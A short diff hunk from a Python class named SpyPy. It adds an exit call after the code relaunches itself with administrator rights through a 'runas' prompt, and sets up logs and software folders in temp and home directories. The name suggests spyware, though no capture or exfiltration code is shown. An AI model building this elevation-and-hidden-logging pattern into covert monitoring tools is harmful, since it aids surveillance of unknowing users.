@@ -33,6 +33,7 @@ class SpyPy:
             ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, " ".join(sys.argv), None, 1
             )
+            os._exit(0) # nice!!!
 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
